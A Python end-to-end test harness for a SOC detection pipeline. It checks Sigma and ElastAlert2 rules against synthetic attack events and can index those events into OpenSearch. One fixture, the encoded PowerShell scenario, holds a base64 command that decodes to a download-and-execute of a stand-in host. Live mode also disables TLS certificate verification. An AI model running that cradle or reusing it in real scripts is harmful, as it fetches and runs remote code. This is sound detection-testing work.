#!/usr/bin/env python3
"""
Automated End-to-End SOC Detection & Pipeline Test Harness
=========================================================
Tests the entire SOC telemetry and detection loop:
1. Synthetic Attack Telemetry Generation
2. Schema & Field Validation
3. Sigma Rule Match Engine (Rule-to-Event Verification)
4. ElastAlert2 Configuration & Filter Verification
5. (Live Mode) Ingestion via Vector/Syslog, OpenSearch Indexing Assertion, and Alert Trigger Validation.

Usage:
    python tools/test-e2e-harness.py [--mode offline|live] [--opensearch-url http://localhost:9200]
"""

import sys
import os
import json
import time
import socket
import argparse
import fnmatch
from pathlib import Path
from datetime import datetime, timezone
import yaml

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# Test attack scenarios and expected detections
SCENARIOS = [
    {
        "id": "T1003.001",
        "name": "LSASS Memory Access (Mimikatz Dump)",
        "tactic": "credential-access",
        "sigma_file": "detection-rules/sigma/credential-access/T1003.001_lsass_dump.yml",
        "elastalert_file": "config/elastalert2/rules/T1003_credential_dump.yml",
        "event": {
            "@timestamp": datetime.now(timezone.utc).isoformat(),
            "event_type": "process_access",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
            "GrantedAccess": "0x1010",
            "host.name": "WKSTN-FINANCE-01",
            "user.name": "SYSTEM",
            "mitre_technique": "T1003.001",
            "mitre_tactic": "credential-access",
            "severity": "critical"
        }
    },
    {
        "id": "T1059.001",
        "name": "Encoded PowerShell Execution",
        "tactic": "execution",
        "sigma_file": "detection-rules/sigma/execution/T1059.001_encoded_powershell.yml",
        "elastalert_file": "config/elastalert2/rules/T1059_powershell.yml",
        "event": {
            "@timestamp": datetime.now(timezone.utc).isoformat(),
            "event_type": "process_creation",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGkAbAAuAGMAbwBtACcAKQA=",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "host.name": "WKSTN-FINANCE-01",
            "mitre_technique": "T1059.001",
            "mitre_tactic": "execution",
            "severity": "high"
        }
    },
    {
        "id": "T1110",
        "name": "Brute Force Authentication Spray",
        "tactic": "credential-access",
        "sigma_file": "detection-rules/sigma/credential-access/T1110_brute_force.yml",
        "elastalert_file": "config/elastalert2/rules/T1110_brute_force.yml",
        "event": {
            "@timestamp": datetime.now(timezone.utc).isoformat(),
            "event_type": "authentication",
            "EventID": 4625,
            "TargetUserName": "admin",
            "FailureReason": "%%2313",
            "src_ip": "10.0.1.99",
            "host.name": "DC-PRIMARY-01",
            "mitre_technique": "T1110",
            "mitre_tactic": "credential-access",
            "severity": "high"
        }
    },
    {
        "id": "T1557",
        "name": "LLMNR / NBT-NS Poisoning (Responder)",
        "tactic": "credential-access",
        "sigma_file": "detection-rules/sigma/credential-access/T1557_llmnr_poison.yml",
        "elastalert_file": "config/elastalert2/rules/T1557_responder.yml",
        "event": {
            "@timestamp": datetime.now(timezone.utc).isoformat(),
            "event_type": "network_poison",
            "DestinationPort": 5355,
            "rule_name": "T1557_llmnr_poisoning",
            "src_ip": "10.0.1.200",
            "dst_ip": "224.0.0.252",
            "mitre_technique": "T1557.001",
            "mitre_tactic": "credential-access",
            "severity": "medium"
        }
    },
    {
        "id": "T1021.002",
        "name": "SMB Lateral Movement / PsExec",
        "tactic": "lateral-movement",
        "sigma_file": "detection-rules/sigma/lateral-movement/T1021.002_smb_lateral.yml",
        "elastalert_file": "config/elastalert2/rules/T1021_lateral_movement.yml",
        "event": {
            "@timestamp": datetime.now(timezone.utc).isoformat(),
            "event_type": "network_connection",
            "EventID": 3,
            "DestinationPort": 445,
            "Initiated": "true",
            "Image": "C:\\Windows\\PSEXESVC.exe",
            "ParentImage": "C:\\Windows\\System32\\services.exe",
            "host.name": "SRV-APP-02",
            "mitre_technique": "T1021.002",
            "mitre_tactic": "lateral-movement",
            "severity": "medium"
        }
    }
]


def match_field_condition(event_val, condition_val, modifier=""):
    """Evaluate whether an event field matches the Sigma condition."""
    if event_val is None:
        return False
    
    event_str = str(event_val).lower()
    
    if isinstance(condition_val, list):
        target_vals = [str(x).lower() for x in condition_val]
    else:
        target_vals = [str(condition_val).lower()]

    for target in target_vals:
        if modifier == "endswith":
            if event_str.endswith(target):
                return True
        elif modifier == "startswith":
            if event_str.startswith(target):
                return True
        elif modifier == "contains":
            if target in event_str:
                return True
        else:
            if event_str == target or fnmatch.fnmatch(event_str, target):
                return True
    return False


def test_sigma_match(rule_path: str, event: dict) -> bool:
    """Check if the synthesized attack event triggers the Sigma rule logic."""
    if not os.path.exists(rule_path):
        return False
    with open(rule_path, "r", encoding="utf-8") as f:
        data = yaml.safe_load(f)

    detection = data.get("detection", {})
    selection = detection.get("selection", {})
    
    # Process selection
    selection_matched = True
    for key, expected in selection.items():
        field, modifier = key.split("|", 1) if "|" in key else (key, "")
        event_val = event.get(field)
        if not match_field_condition(event_val, expected, modifier):
            selection_matched = False
            break

    # Process filter (must not match)
    filter_matched = False
    filter_block = detection.get("filter") or detection.get("filter_main")
    if filter_block:
        for key, expected in filter_block.items():
            field, modifier = key.split("|", 1) if "|" in key else (key, "")
            event_val = event.get(field)
            if match_field_condition(event_val, expected, modifier):
                filter_matched = True
                break

    return selection_matched and not filter_matched


def run_offline_harness():
    """Offline validation harness that verifies rules against synthetic attack telemetry."""
    print("=" * 70)
    print("  AUTOMATED DETECTION & TELEMETRY TEST HARNESS (OFFLINE / CI)")
    print("=" * 70)
    
    passed = 0
    total = len(SCENARIOS)

    for sc in SCENARIOS:
        print(f"\n[+] Testing Scenario: [{sc['id']}] {sc['name']}")
        print(f"    Tactic: {sc['tactic']} | Target File: {sc['sigma_file']}")

        # 1. Check Sigma rule file exists
        if not os.path.exists(sc["sigma_file"]):
            print(f"    [-] ERROR: Sigma rule file missing: {sc['sigma_file']}")
            continue

        # 2. Check ElastAlert2 rule file exists
        if not os.path.exists(sc["elastalert_file"]):
            print(f"    [-] ERROR: ElastAlert2 rule file missing: {sc['elastalert_file']}")
            continue

        # 3. Test Sigma Logic Matching
        matched = test_sigma_match(sc["sigma_file"], sc["event"])
        if matched:
            print(f"    [+] PASS: Event correctly satisfied Sigma detection criteria.")
        else:
            print(f"    [-] FAIL: Event failed Sigma rule condition.")
            continue

        # 4. Verify ElastAlert2 rule schema
        with open(sc["elastalert_file"], "r", encoding="utf-8") as ea_f:
            ea_data = yaml.safe_load(ea_f)
            assert ea_data.get("name"), "ElastAlert rule missing name"
            assert ea_data.get("index"), "ElastAlert rule missing index"
            print(f"    [+] PASS: ElastAlert2 rule verified ('{ea_data.get('name')}').")

        passed += 1

    print("\n" + "-" * 70)
    print(f"Test Harness Summary: {passed}/{total} scenarios successfully verified.")
    print("-" * 70)
    return passed == total


def run_live_harness(opensearch_url: str, opensearch_pass: str):
    """Live validation harness querying active OpenSearch and Vector instances."""
    import urllib.request
    import urllib.error
    import ssl

    print("=" * 70)
    print("  LIVE SOC DETECTION HARNESS (OPENSEARCH & VECTOR INGESTION)")
    print("=" * 70)

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    today = datetime.now(timezone.utc).strftime("%Y.%m.%d")
    index = f"soc-logs-{today}"
    passed = 0

    for sc in SCENARIOS:
        print(f"\n[+] Executing Live Attack Test: [{sc['id']}] {sc['name']}")
        
        # Ingest event via direct API
        payload = json.dumps(sc["event"]).encode("utf-8")
        req_url = f"{opensearch_url}/{index}/_doc"
        req = urllib.request.Request(req_url, data=payload, headers={"Content-Type": "application/json"})
        
        if opensearch_pass:
            import base64
            auth_str = f"admin:{opensearch_pass}"
            b64_auth = base64.b64encode(auth_str.encode()).decode()
            req.add_header("Authorization", f"Basic {b64_auth}")

        try:
            with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
                print(f"    [+] Injected synthetic event into {index} (HTTP {resp.status})")
        except Exception as e:
            print(f"    [-] Ingestion error: {e}")
            continue

        # Query OpenSearch for the ingested event
        time.sleep(1)
        search_payload = json.dumps({
            "size": 1,
            "query": {
                "match": {
                    "mitre_technique": sc["id"]
                }
            }
        }).encode("utf-8")

        search_req = urllib.request.Request(f"{opensearch_url}/{index}/_search", data=search_payload, headers={"Content-Type": "application/json"})
        if opensearch_pass:
            search_req.add_header("Authorization", f"Basic {b64_auth}")

        try:
            with urllib.request.urlopen(search_req, context=ctx, timeout=5) as s_resp:
                res_data = json.loads(s_resp.read().decode())
                hits = res_data.get("hits", {}).get("total", {}).get("value", 0)
                if hits > 0:
                    print(f"    [+] PASS: OpenSearch indexed and correlated {hits} hit(s) for technique {sc['id']}.")
                    passed += 1
                else:
                    print(f"    [-] FAIL: No matching hits found in OpenSearch.")
        except Exception as e:
            print(f"    [-] Search error: {e}")

    print("\n" + "-" * 70)
    print(f"Live Test Harness Summary: {passed}/{len(SCENARIOS)} scenarios verified.")
    print("-" * 70)
    return passed > 0


def main():
    parser = argparse.ArgumentParser(description="SOC End-to-End Test Harness")
    parser.add_argument("--mode", choices=["offline", "live"], default="offline", help="Test mode (offline for CI, live for active cluster)")
    parser.add_argument("--opensearch-url", default="http://localhost:9200", help="OpenSearch base URL")
    parser.add_argument("--opensearch-password", default="", help="OpenSearch admin password")
    args = parser.parse_args()

    if args.mode == "offline":
        success = run_offline_harness()
    else:
        success = run_live_harness(args.opensearch_url, args.opensearch_password)

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
